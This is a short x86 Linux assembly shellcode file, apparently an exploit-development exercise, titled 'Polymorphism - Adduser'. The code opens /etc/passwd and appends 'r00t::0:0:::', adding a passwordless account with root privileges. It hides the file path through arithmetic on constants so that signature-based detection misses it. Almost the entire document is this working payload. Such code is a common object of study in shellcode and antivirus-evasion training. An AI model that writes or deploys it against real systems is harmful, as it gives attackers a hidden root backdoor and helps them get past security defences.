;Author: Ymir F. Eboras
;Polymorphism - Adduser



global _start

section .text

_start:  

        push byte +0x5
        pop eax
        xor ecx,ecx
        push ecx

        ;push dword 0x64777373            ;sswd
	
	mov esi, 0x42555151
	add esi, 0x22222222
	mov dword [esp-0x4], esi

        ;push dword 0x61702f2f             ;//pa
	
	mov esi, 0x3f4e0d0d
	add esi, 0x22222222
	mov dword [esp-0x8], esi

        ;push dword 0x6374652f		  ;/etc
	
	mov esi, 0x74857640        
	sub esi, 0x11111111
	mov dword [esp-0xc], esi
	
	sub esp, 0xc

	mov ebx,esp
        mov cx, 0x401
        int 0x80
        mov ebx,eax
        

	push byte +0x4
        pop eax
        xor edx,edx
        push edx
        
	push dword 0x3a3a3a30		  ;0:::
	push dword 0x3a303a3a		  ;::0: 
	push dword 0x74303072		  ;r00t
	
	mov ecx,esp
        push byte +0xc
        pop edx
        int 0x80
        push byte +0x6
        pop eax
        int 0x80
        push byte +0x1
        pop eax
        int 0x80



	
